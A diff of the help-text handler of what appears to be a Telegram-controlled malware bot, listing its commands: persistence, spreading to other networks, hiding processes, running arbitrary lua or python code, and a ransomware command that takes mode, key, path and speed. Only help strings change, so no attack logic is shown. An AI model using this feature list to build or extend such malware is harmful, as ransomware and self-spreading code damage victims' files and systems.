@@ -2,13 +2,20 @@
 Object.defineProperty(exports, "__esModule", { value: true });
 const help = (text) => {
     console.log("help called");
-    const helpCommand = text.substring(5, text.length);
+    const helpCommand = text.substring(6, text.length);
     if (helpCommand) {
-        console.log("Returning help command");
+        switch (helpCommand) {
+            case "backup":
+                return `/command path
+path is the filesystem path you wabt to backup. Example:
+/backup /home`;
+            /* TODO: End all the help commands */
+            default:
+                return `There is no help for ${helpCommand}.`;
+        }
         return "Help Recv (" + helpCommand + ")";
     }
     else {
-        console.log("Else called");
         return `
 - Not Implemented Commands:
 
@@ -32,9 +39,6 @@ Make the malware persist in the system
 
 /pivot
 Try to spread the malware to other computers, devices and networks
-
-/ransomware path host <key>
-Encrypt all the files from the path (recursively). Ask the encryption key to remote host or provide it from telegram
 
 /stealth
 Make the program hidde it's processes
@@ -72,6 +76,13 @@ Run lua code
 
 /python code
 Run python code
+
+/ransomware mode key path speed
+Encrypt/Decrypt all the files under path
+mode  -> e,d
+key   -> your_key
+path  -> /home/folderToEncrypt
+speed -> 1,2,3,4,5,6,7,8,9,10,11 (faster to slowest)
 
 `;
     }
